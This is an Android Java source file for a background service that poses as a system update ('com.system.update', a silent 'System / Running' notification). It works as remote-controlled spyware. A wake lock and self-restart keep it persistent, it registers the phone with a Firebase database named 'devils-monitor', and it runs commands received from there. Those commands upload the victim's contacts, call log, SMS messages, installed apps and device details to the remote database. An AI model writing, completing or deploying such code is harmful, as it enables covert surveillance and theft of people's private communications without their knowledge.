package com.system.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class FirebaseService extends Service {

    private static final String DB_URL = "https://devils-monitor-default-rtdb.firebaseio.com";
    private static final String CH_ID = "sys_update_ch";
    private static final int NOTIF_ID = 1;

    private DatabaseReference deviceRef, commandsRef;
    private String deviceId;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();

        // WakeLock عشان الخدمة ما تُقتل
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sys:service");
        wakeLock.acquire();

        // قناة الإشعارات (Foreground Service)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CH_ID, "System",
                    NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            nm.createNotificationChannel(ch);
        }

        // إشعار صامت (Foreground Service إلزامي)
        Notification notif = new NotificationCompat.Builder(this, CH_ID)
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setContentTitle("System")
                .setContentText("Running")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
        startForeground(NOTIF_ID, notif);

        // اختبار الاتصال
        FirebaseDatabase.getInstance(DB_URL)
            .getReference("ping")
            .setValue("started_" + System.currentTimeMillis());

        deviceId = getDeviceId(this);
        FirebaseDatabase db = FirebaseDatabase.getInstance(DB_URL);
        deviceRef = db.getReference("devices").child(deviceId);
        commandsRef = db.getReference("commands").child(deviceId);
        registerDevice();
        listenCommands();
    }

    private String getDeviceId(Context c) {
        android.content.SharedPreferences sp = c.getSharedPreferences("dev", MODE_PRIVATE);
        String id = sp.getString("id", null);
        if (id == null) {
            id = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            sp.edit().putString("id", id).apply();
        }
        return id;
    }

    private void registerDevice() {
        Map<String, Object> info = new HashMap<>();
        info.put("model", Build.MODEL);
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("androidVersion", Build.VERSION.RELEASE);
        info.put("sdkInt", Build.VERSION.SDK_INT);
        info.put("deviceId", deviceId);
        info.put("status", "online");
        info.put("lastSeen", System.currentTimeMillis());
        deviceRef.setValue(info);
        deviceRef.child("status").onDisconnect().setValue("offline");
    }

    private void listenCommands() {
        commandsRef.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(@NonNull DataSnapshot s, @Nullable String p) {
                Map<String, Object> cmd = (Map<String, Object>) s.getValue();
                if (cmd != null) exec(cmd);
                s.getRef().removeValue();
            }
            @Override public void onChildChanged(@NonNull DataSnapshot s, @Nullable String p) {}
            @Override public void onChildRemoved(@NonNull DataSnapshot s) {}
            @Override public void onChildMoved(@NonNull DataSnapshot s, @Nullable String p) {}
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        });
    }

    private void exec(Map<String, Object> cmd) {
        String type = (String) cmd.get("type");
        if (type == null) return;
        DatabaseReference dataRef = FirebaseDatabase.getInstance(DB_URL).getReference("data").child(deviceId);
        try {
            switch (type) {
                case "vibrate": {
                    android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        v.vibrate(android.os.VibrationEffect.createOneShot(1000,
                                android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                    else v.vibrate(1000);
                    break;
                }
                case "show_toast": {
                    String m = (String) cmd.get("message");
                    Toast.makeText(this, m == null ? "" : m, Toast.LENGTH_LONG).show();
                    break;
                }
                case "torch_on": case "torch_off": {
                    try {
                        android.hardware.camera2.CameraManager cm =
                                (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
                        cm.setTorchMode(cm.getCameraIdList()[0], type.equals("torch_on"));
                    } catch (Exception e) {}
                    break;
                }
                case "get_contacts": Helpers.pushContacts(this, dataRef); break;
                case "get_call_log": Helpers.pushCalls(this, dataRef); break;
                case "get_sms_log": Helpers.pushSms(this, dataRef); break;
                case "get_installed_apps": Helpers.pushApps(this, dataRef); break;
                case "get_system_info": Helpers.pushSystem(this, dataRef); break;
                default: Log.d("CMD", "Unknown: " + type);
            }
        } catch (Exception e) {
            Map<String, Object> err = new HashMap<>();
            err.put("command", type);
            err.put("error", e.getMessage());
            dataRef.child("errors").push().setValue(err);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
                              }
